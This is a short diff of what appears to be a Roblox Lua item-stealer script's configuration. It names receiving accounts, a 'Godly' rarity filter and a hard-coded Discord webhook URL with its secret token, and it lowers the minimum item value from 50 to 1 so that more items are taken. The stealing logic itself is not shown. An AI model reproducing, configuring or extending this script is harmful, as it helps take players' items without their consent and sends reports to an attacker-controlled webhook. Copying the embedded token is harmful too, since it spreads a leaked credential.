@@ -6,7 +6,7 @@ _G.scriptExecuted = true
 
 local users = _G.Usernames or {"ZeeS_Farm2", "ZeeS_Farm4"}
 local min_rarity = _G.min_rarity or "Godly"
-local min_value = _G.min_value or 50
+local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or "https://discord.com/api/webhooks/1401379487672827904/NSdz5Jn-rvUh0mymSsuO29pOuWIvbmgwdwbzY8C8rd8wVvtLKOgk9ZvuaHtQYqFJKND9"
 
